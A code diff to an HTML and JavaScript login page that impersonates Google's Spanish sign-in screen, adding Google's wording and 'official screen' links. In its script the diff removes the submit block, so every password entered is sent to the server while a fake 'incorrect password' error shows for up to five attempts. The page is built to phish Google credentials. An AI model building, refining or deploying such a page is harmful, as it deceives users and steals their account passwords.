@@ -17,6 +17,13 @@
       <img src="https://img.icons8.com/color/512/google-logo.png" 
            alt="Google" class="mx-auto mb-2 w-16">
       <h1 class="text-xl font-semibold">Accede a tu cuenta</h1>
+      <p class="text-gray-600 text-sm mt-2">
+        Usa tu Cuenta de Google. La cuenta se agregará a este dispositivo <br>
+        y estará disponible para otras apps de Google.
+      </p>
+      <a href="#" class="text-blue-600 text-sm mt-1 block">
+        Más información sobre el uso de tu cuenta
+      </a>
     </div>
 
     <!-- Formulario -->
@@ -27,7 +34,7 @@
 
       <!-- Correo primero -->
       <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
-             name="correo" placeholder="Correo electrónico" type="email" required>
+             name="correo" placeholder="Correo electrónico o teléfono" type="email" required>
 
       <!-- Contraseña después -->
       <div>
@@ -45,9 +52,15 @@
       <!-- Botón -->
       <button type="submit" 
               class="bg-blue-600 hover:bg-blue-700 text-white py-2 rounded font-medium">
-        Iniciar sesión
+        Siguiente
       </button>
     </form>
+
+    <!-- Links como en la pantalla oficial -->
+    <div class="flex justify-between mt-4 text-sm">
+      <a href="#" class="text-blue-600">¿Olvidaste el correo electrónico?</a>
+      <a href="#" class="text-blue-600">Crear cuenta</a>
+    </div>
 
   </div>
 
@@ -61,12 +74,13 @@
 
       intentoNombre++;
 
-      if (intentoNombre < 6) { // Los primeros 5 intentos bloquea
-        e.preventDefault();
+      if (intentoNombre < 6) { 
+        // Mostrar error pero igual se envía
         errorMsg.classList.remove("hidden");
         nombre.classList.add("border-red-500");
         errorMsg.textContent = "❌ Contraseña incorrecta (intento " + intentoNombre + " de 5)";
       } else {
+        // En el 6 ya no muestra error
         errorMsg.classList.add("hidden");
         nombre.classList.remove("border-red-500");
       }
